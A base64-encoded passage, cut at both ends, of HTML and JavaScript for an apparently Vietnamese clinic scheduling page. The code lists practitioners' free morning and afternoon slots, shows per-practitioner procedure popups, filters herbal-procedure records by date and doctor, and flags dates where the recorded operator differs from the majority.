mU6MThweCI+DQo8ZGl2IGlkPSJsb2FkaW5nVGV4dCI+DQo8aSBjbGFzcz0iZmFzIGZhLXNwaW5uZXIgZmEtc3BpbiIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMzNDk4ZGI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICDEkGFuZyBn4butaSBk4buvIGxp4buHdSB24buBIG3DoXkgY2jhu6cuLi4NCiAgICA8L2Rpdj4NCjxkaXYgaWQ9InByb2dyZXNzQmFyQ29udGFpbmVyIj4NCjxkaXYgaWQ9InByb2dyZXNzQmFyIj48L2Rpdj4NCjxkaXYgaWQ9ImF2YWlsYWJpbGl0eVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLXRvcDogMjBweDsiPg0KICA8aDI+VGjhu5FuZyBrw6ogZ2nhu50gdHLhu5FuZyB04burbmcgbmfGsOG7nWk8L2gyPg0KICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICA8dGhlYWQ+DQogICAgICA8dHI+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgDQogICAgICAgIDx0aD5HaeG7nSB0cuG7kW5nIGJ14buVaSBzw6FuZzwvdGg+DQogICAgICAgIDx0aD5HaeG7nSB0cuG7kW5nIGJ14buVaSBjaGnhu4F1PC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImF2YWlsYWJpbGl0eUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCjwhLS0gS+G6vlQgVEjDmkM6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uKCkgew0KICBjb25zdCBub2lkdW5nID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm5vaWR1bmciKTsNCiAgY29uc3QgbGlzdDEgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIubGlzdDEiKTsNCg0KICBpZiAobm9pZHVuZyAmJiBsaXN0MSkgew0KICAgIGNvbnN0IHRleHQgPSBub2lkdW5nLnRleHRDb250ZW50IHx8IG5vaWR1bmcuaW5uZXJUZXh0IHx8ICIiOw0KICAgIGlmICh0ZXh0LnRyaW0oKSA9PT0gIiIpIHsNCiAgICAgIGxpc3QxLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9DQp9KTsNCg0KLy8gPT09PSBUw41OSCBUT8OBTiBHSeG7nCBUUuG7kE5HIENITyBU4buqTkcgTkfGr+G7nEkgPT09PQ0KDQoNCg0KZnVuY3Rpb24gdG9nZ2xlQXZhaWxhYmlsaXR5KCkgew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F2YWlsYWJpbGl0eVRhYmxlJyk7DQogICAgY29uc3QgZmlsdGVyQmxvY2sgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXZhaWxhYmlsaXR5RmlsdGVyQmxvY2snKTsNCiAgICBpZiAodGFibGUuc3R5bGUuZGlzcGxheSA9PT0gJ25vbmUnKSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBpZiAoZmlsdGVyQmxvY2spIGZpbHRlckJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBjYWxjdWxhdGVBdmFpbGFiaWxpdHkoKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICBpZiAoZmlsdGVyQmxvY2spIGZpbHRlckJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSgpIHsNCiAgICBjb25zdCBncm91cHMgPSB7fTsNCiAgICBhbGxQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGNvbnN0IGtleSA9IGAke3Byb2Mub3BlcmF0b3J9XyR7cHJvYy5kYXRlfWA7DQogICAgICAgIGlmICghZ3JvdXBzW2tleV0pIGdyb3Vwc1trZXldID0gW107DQogICAgICAgIGdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgfSk7DQoNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmFpbGFiaWxpdHlCb2R5Jyk7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgICBjb25zdCBzZWxlY3RlZE9wID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlck9wZXJhdG9yJyk/LnZhbHVlIHx8ICdhbGwnOw0KICAgIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk/LnZhbHVlIHx8ICdhbGwnOw0KDQogICAgLy8gQ2jhu4kga2jhu59pIHThuqFvIGRyb3Bkb3duIDEgbOG6p24NCiAgICBpZiAoIWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpLmRhdGFzZXQuaW5pdGlhbGl6ZWQpIHsNCiAgICAgICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLm9wZXJhdG9yKSldLnNvcnQoKTsNCiAgICAgICAgY29uc3QgZGF0ZXMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAuZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCBvcFNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpOw0KICAgICAgICBjb25zdCBkYXRlU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlckRhdGUnKTsNCg0KICAgICAgICBvcFNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICAgICAgZGF0ZVNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICBkYXRlcy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KDQogICAgICAgIG9wU2VsZWN0LmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQogICAgICAgIGRhdGVTZWxlY3QuZGF0YXNldC5pbml0aWFsaXplZCA9ICd0cnVlJzsNCg0KICAgICAgICBvcFNlbGVjdC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBjYWxjdWxhdGVBdmFpbGFiaWxpdHkpOw0KICAgICAgICBkYXRlU2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSk7DQogICAgfQ0KDQogICAgT2JqZWN0LmtleXMoZ3JvdXBzKS5mb3JFYWNoKGtleSA9PiB7DQogICAgICAgIGNvbnN0IFtvcGVyYXRvciwgZGF0ZV0gPSBrZXkuc3BsaXQoJ18nKTsNCiAgICAgICAgaWYgKChzZWxlY3RlZE9wICE9PSAnYWxsJyAmJiBvcGVyYXRvciAhPT0gc2VsZWN0ZWRPcCkgfHwNCiAgICAgICAgICAgIChzZWxlY3RlZERhdGUgIT09ICdhbGwnICYmIGRhdGUgIT09IHNlbGVjdGVkRGF0ZSkpIHJldHVybjsNCg0KICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gZ3JvdXBzW2tleV07DQogICAgICAgIHByb2NlZHVyZXMuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KDQogICAgICAgIGNvbnN0IG1vcm5pbmdTdGFydCA9IDcgKiAzNjAwOw0KICAgICAgICBjb25zdCBtb3JuaW5nRW5kID0gMTEuNSAqIDM2MDA7DQogICAgICAgIGNvbnN0IGFmdGVybm9vblN0YXJ0ID0gMTMuNSAqIDM2MDA7DQogICAgICAgIGNvbnN0IGFmdGVybm9vbkVuZCA9IDE3ICogMzYwMDsNCg0KICAgICAgICBjb25zdCBtb3JuaW5nRnJlZSA9IGdldEZyZWVTbG90cyhwcm9jZWR1cmVzLCBtb3JuaW5nU3RhcnQsIG1vcm5pbmdFbmQpOw0KICAgICAgICBjb25zdCBhZnRlcm5vb25GcmVlID0gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIGFmdGVybm9vblN0YXJ0LCBhZnRlcm5vb25FbmQpOw0KDQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPHRkPjxhIGhyZWY9IiMiIG9uY2xpY2s9InNob3dQcm9jZWR1cmVzRm9yT3BlcmF0b3IoXGAke29wZXJhdG9yfVxgLCBcYCR7ZGF0ZX1cYCk7cmV0dXJuIGZhbHNlOyIgc3R5bGU9ImNvbG9yOiMzNDk4ZGI7Zm9udC13ZWlnaHQ6Ym9sZCI+JHtvcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L2E+PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2RhdGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke21vcm5pbmdGcmVlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHthZnRlcm5vb25GcmVlfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCg0KZnVuY3Rpb24gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIHN0YXJ0LCBlbmQpIHsNCiAgICBjb25zdCBidXN5ID0gcHJvY2VkdXJlcy5tYXAocCA9PiAoew0KICAgICAgICBzdGFydDogcC5zdGFydCwNCiAgICAgICAgZW5kOiBwLmVuZCArICgocC5wcm9jZWR1cmVJbmZvPy5idWZmZXIgfHwgMCkgKiA2MCkNCiAgICB9KSkuZmlsdGVyKHAgPT4gcC5lbmQgPiBzdGFydCAmJiBwLnN0YXJ0IDwgZW5kKTsNCg0KICAgIGJ1c3kuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KDQogICAgY29uc3QgZnJlZSA9IFtdOw0KICAgIGxldCBjdXJzb3IgPSBzdGFydDsNCg0KICAgIGZvciAoY29uc3QgYiBvZiBidXN5KSB7DQogICAgICAgIGlmIChiLnN0YXJ0ID4gY3Vyc29yICYmIGIuc3RhcnQgPiBzdGFydCAmJiBjdXJzb3IgPCBlbmQpIHsNCiAgICAgICAgICAgIGNvbnN0IGZyZWVTdGFydCA9IE1hdGgubWF4KGN1cnNvciwgc3RhcnQpOw0KICAgICAgICAgICAgY29uc3QgZnJlZUVuZCA9IE1hdGgubWluKGIuc3RhcnQsIGVuZCk7DQogICAgICAgICAgICBpZiAoZnJlZUVuZCA+IGZyZWVTdGFydCkgew0KICAgICAgICAgICAgICAgIGZyZWUucHVzaChgJHtmb3JtYXRUaW1lKGZyZWVTdGFydCl9IC0gJHtmb3JtYXRUaW1lKGZyZWVFbmQpfWApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGN1cnNvciA9IE1hdGgubWF4KGN1cnNvciwgYi5lbmQpOw0KICAgIH0NCg0KICAgIGlmIChjdXJzb3IgPCBlbmQpIHsNCiAgICAgICAgZnJlZS5wdXNoKGAke2Zvcm1hdFRpbWUoY3Vyc29yKX0gLSAke2Zvcm1hdFRpbWUoZW5kKX1gKTsNCiAgICB9DQoNCiAgICByZXR1cm4gZnJlZS5sZW5ndGggPyBmcmVlLmpvaW4oJzxicj4nKSA6ICc8aT5LaMO0bmcgY8OybiB0cuG7kW5nPC9pPic7DQp9DQoNCmZ1bmN0aW9uIGZvcm1hdFRpbWUoc2VjKSB7DQogICAgY29uc3QgaCA9IE1hdGguZmxvb3Ioc2VjIC8gMzYwMCk7DQogICAgY29uc3QgbSA9IE1hdGguZmxvb3IoKHNlYyAlIDM2MDApIC8gNjApOw0KICAgIHJldHVybiBoLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKSArICdoJyArIG0udG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpOw0KfQ0KDQpmdW5jdGlvbiBzaG93UHJvY2VkdXJlc0Zvck9wZXJhdG9yKG9wZXJhdG9yLCBkYXRlKSB7DQogICAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVPdmVybGF5Jyk7DQogICAgY29uc3QgY29udGVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwb3B1cENvbnRlbnQnKTsNCiAgICBjb25zdCBsaXN0ID0gYWxsUHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLm9wZXJhdG9yID09PSBvcGVyYXRvciAmJiBwLmRhdGUgPT09IGRhdGUpOw0KDQogICAgaWYgKGxpc3QubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gIjxpPktow7RuZyB0w6xtIHRo4bqleSB0aOG7pyB0aHXhuq10PC9pPiI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgbGlzdC5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQogICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gIjxiPk5nxrDhu51pIHRo4buxYyBoaeG7h246PC9iPiAiICsgb3BlcmF0b3IgKyAiPGJyPjxiPk5nw6B5OjwvYj4gIiArIGRhdGUgKyAiPGJyPjxicj4iICsNCiAgICAgICAgICAgICI8dWwgc3R5bGU9J3BhZGRpbmctbGVmdDoyMHB4Jz4iICsgbGlzdC5tYXAocCA9PiANCiAgICAgICAgICAgICAgICAiPGxpPjxiPiIgKyBwLnBhdGllbnROYW1lICsgIjwvYj4gLSAiICsgcC5wcm9jZWR1cmUgKyAiICgiICsgcC5kaXNwbGF5U3RhcnQgKyAiIOKGkiAiICsgcC5kaXNwbGF5RW5kICsgIik8L2xpPiINCiAgICAgICAgICAgICkuam9pbignJykgKyAiPC91bD4iOw0KICAgIH0NCg0KICAgIG92ZXJsYXkuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQp9DQoNCmZ1bmN0aW9uIGNsb3NlUHJvY2VkdXJlUG9wdXAoKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZU92ZXJsYXknKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KfQ0KPC9zY3JpcHQ+DQo8IS0tIFBvcHVwIHRo4bunIHRodeG6rXQgY2hpIHRp4bq/dCB24bubaSBvdmVybGF5IC0tPg0KPGRpdiBpZD0icHJvY2VkdXJlT3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC40KTt6LWluZGV4OjEwMDAwIiBvbmNsaWNrPSJjbG9zZVByb2NlZHVyZVBvcHVwKCkiPg0KICA8ZGl2IGlkPSJwcm9jZWR1cmVQb3B1cCIgb25jbGljaz0iZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCkiIHN0eWxlPSJwb3NpdGlvbjpyZWxhdGl2ZTt0b3A6MTAlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpO2JhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO2JvcmRlcjoycHggc29saWQgIzM0OThkYjtwYWRkaW5nOjIwcHg7Ym9yZGVyLXJhZGl1czo4cHg7Ym94LXNoYWRvdzowIDVweCAyMHB4IHJnYmEoMCwwLDAsMC4zKTttYXgtaGVpZ2h0Ojcwdmg7b3ZlcmZsb3c6YXV0bztmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmO21heC13aWR0aDo2MDBweCI+DQogICAgPGgzPkNoaSB0aeG6v3QgdGjhu6cgdGh14bqtdDwvaDM+DQogICAgPGRpdiBpZD0icG9wdXBDb250ZW50Ij48L2Rpdj4NCiAgICA8YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VQcm9jZWR1cmVQb3B1cCgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCg0KDQoNCg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gcmVuZGVySGVyYkxpc3QoKSB7DQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRhYmxlQm9keScpOw0KICAgIHRib2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgY29uc3QgaGVyYnMgPSB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW107DQogICAgY29uc3QgZGF0ZUZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICAgIGNvbnN0IGRvY3RvckZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRG9jdG9yRmlsdGVyJyk7DQoNCiAgICBpZiAoIWRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCkgew0KICAgICAgICBjb25zdCB1bmlxdWVEYXRlcyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoID0+IGguZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCB1bmlxdWVEb2N0b3JzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGggPT4gaC5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnKSldLnNvcnQoKTsNCg0KICAgICAgICBkYXRlRmlsdGVyLmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgICAgIHVuaXF1ZURhdGVzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQoNCiAgICAgICAgZG9jdG9yRmlsdGVyLmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4nICsNCiAgICAgICAgICAgIHVuaXF1ZURvY3RvcnMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCg0KICAgICAgICBkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAidHJ1ZSI7DQogICAgICAgIGRhdGVGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVySGVyYkxpc3QpOw0KICAgICAgICBkb2N0b3JGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVySGVyYkxpc3QpOw0KICAgIH0NCg0KICAgIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRhdGVGaWx0ZXIudmFsdWU7DQogICAgY29uc3Qgc2VsZWN0ZWREb2N0b3IgPSBkb2N0b3JGaWx0ZXIudmFsdWU7DQoNCiAgICBjb25zdCBmaWx0ZXJlZEhlcmJzID0gaGVyYnMuZmlsdGVyKHAgPT4NCiAgICAgICAgKHNlbGVjdGVkRGF0ZSA9PT0gJ2FsbCcgfHwgcC5kYXRlID09PSBzZWxlY3RlZERhdGUpICYmDQogICAgICAgIChzZWxlY3RlZERvY3RvciA9PT0gJ2FsbCcgfHwgcC5kb2N0b3IgPT09IHNlbGVjdGVkRG9jdG9yKQ0KICAgICk7DQoNCiAgICBpZiAoZmlsdGVyZWRIZXJicy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoImhlcmItcm93Iik7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgPHRkIGNvbHNwYW49IjUiPjxjZW50ZXI+S2jDtG5nIGPDsyBk4buvIGxp4buHdSBz4bqvYyB0aHXhu5FjIHRoYW5nPC9jZW50ZXI+PC90ZD5gOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgZmlsdGVyZWRIZXJicy5mb3JFYWNoKHAgPT4gew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke3AucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtwLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3AuZGF0ZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5kaXNwbGF5U3RhcnR9IC0+ICR7cC5kaXNwbGF5RW5kfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCg0KZnVuY3Rpb24gdG9nZ2xlSGVyYkxpc3QoKSB7DQogICAgY29uc3QgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlByb2NlZHVyZVRhYmxlJyk7DQogICAgaWYgKHRhYmxlLnN0eWxlLmRpc3BsYXkgPT09ICdub25lJykgew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgcmVuZGVySGVyYkxpc3QoKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIH0NCn0NCjwvc2NyaXB0Pg0KDQoNCg0KPHNjcmlwdD4NCihmdW5jdGlvbigpew0KICAvKiA9PT09IFRJ4buGTiDDjUNIIENIVeG6qE4gSE/DgSBUw4pOID09PT0gKi8NCiAgZnVuY3Rpb24gY2xlYW5EaXNwbGF5KG5hbWUpew0KICAgIHJldHVybiAobmFtZXx8JycpDQogICAgICAudG9TdHJpbmcoKQ0KICAgICAgLnJlcGxhY2UoL1ss77yMXStccyokLywnJykNCiAgICAgIC5yZXBsYWNlKC9ccysvZywnICcpDQogICAgICAudHJpbSgpOw0KICB9DQogIGZ1bmN0aW9uIG5vcm0obmFtZSl7DQogICAgcmV0dXJuIGNsZWFuRGlzcGxheShuYW1lKS50b0xvd2VyQ2FzZSgpOw0KICB9DQoNCiAgLyogPT09PSBUw41OSCDEkEEgU+G7kCBUSEVPIE5Hw4BZID09PT0gKi8NCiAgZnVuY3Rpb24gY29tcHV0ZU1ham9yaXR5QnlEYXRlKHJvd3Mpew0KICAgIGNvbnN0IG1hcCA9IE9iamVjdC5jcmVhdGUobnVsbCk7DQogICAgcm93cy5mb3JFYWNoKHI9PnsNCiAgICAgIGNvbnN0IGQgPSByLmRhdGU7DQogICAgICBjb25zdCBuID0gbm9ybShyLm9wZXJhdG9yKTsNCiAgICAgIGlmKCFuIHx8IG4gPT09ICdraMO0bmcgY8OzJykgcmV0dXJuOw0KICAgICAgKG1hcFtkXXx8KG1hcFtkXT17fSkpW25dID0gKG1hcFtkXVtuXXx8MCkrMTsNCiAgICB9KTsNCiAgICBjb25zdCBvdXQgPSB7fTsNCiAgICBPYmplY3Qua2V5cyhtYXApLmZvckVhY2goZD0+ew0KICAgICAgY29uc3QgYXJyID0gT2JqZWN0LmVudHJpZXMobWFwW2RdKS5zb3J0KChhLGIpPT5iWzFdLWFbMV0pOw0KICAgICAgY29uc3QgdG9wID0gYXJyWzBdIHx8IFtudWxsLDBdOw0KICAgICAgY29uc3Qgc2Vjb25kID0gYXJyWzFdIHx8IFtudWxsLDBdOw0KICAgICAgb3V0W2RdID0geyB0b3BOb3JtOnRvcFswXSwgdG9wQ291bnQ6dG9wWzFdLCBzZWNvbmRDb3VudDpzZWNvbmRbMV0gfTsNCiAgICB9KTsNCiAgICByZXR1cm4gb3V0Ow0KICB9DQoNCiAgLyogPT09PSBVSSBQSOG7pDogVMOTTSBU4bquVCArIFBPUFVQID09PT0gKi8NCiAgZnVuY3Rpb24gZW5zdXJlT3V0bGllclVJKCl7DQogICAgY29uc3Qgc3VtbWFyeSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllclN1bW1hcnknKTsNCiAgICBjb25zdCBtb2RhbCAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWwnKTsNCiAgICBpZighc3VtbWFyeSkgY29uc29sZS53YXJuKCdUaGnhur91ICNoZXJiT3V0bGllclN1bW1hcnkgdHJvbmcgSFRNTCEnKTsNCiAgICBpZighbW9kYWwpICAgY29uc29sZS53YXJuKCdUaGnhur91ICNoZXJiT3V0bGllck1vZGFsIHRyb25nIEhUTUwhJyk7DQogICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyQ2xvc2VCdG4nKTsNCiAgICBjb25zdCBiYWNrZHJvcCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckJhY2tkcm9wJyk7DQogICAgaWYoYnRuKSBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKT0+bW9kYWwuc3R5bGUuZGlzcGxheT0nbm9uZScpOw0KICAgIGlmKGJhY2tkcm9wKSBiYWNrZHJvcC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT5tb2RhbC5zdHlsZS5kaXNwbGF5PSdub25lJyk7DQogIH0NCiAgZW5zdXJlT3V0bGllclVJKCk7DQoNCiAgLyogPT09PSBHSEkgxJDDiCBIw4BNIFJFTkRFUiA9PT09ICovDQovKiA9PT09IEdISSDEkMOIIEjDgE0gUkVOREVSID09PT0gKi8NCg0KLy8gaGVscGVyOiB0cuG6oyB24buBIGRhbmggc8OhY2ggbmfDoHkgY8OzIGNhIHPhuq9jIHRodeG7kWMgbOG7l2kNCmZ1bmN0aW9uIGdldEhlcmJFcnJvckRhdGVzKGFsbEhlcmJzKXsNCiAgY29uc3QgbWFqb3JpdHkgPSBjb21wdXRlTWFqb3JpdHlCeURhdGUoYWxsSGVyYnMpOw0KICBjb25zdCBkYXRlcyA9IG5ldyBTZXQoKTsNCg0KICBhbGxIZXJicy5mb3JFYWNoKGg9PnsNCiAgICBjb25zdCBtID0gbWFqb3JpdHlbaC5kYXRlXTsNCiAgICBjb25zdCBoYXNNYWpvcml0eSA9IG0gJiYgbS50b3BOb3JtICYmIG0udG9wQ291bnQgPiBtLnNlY29uZENvdW50Ow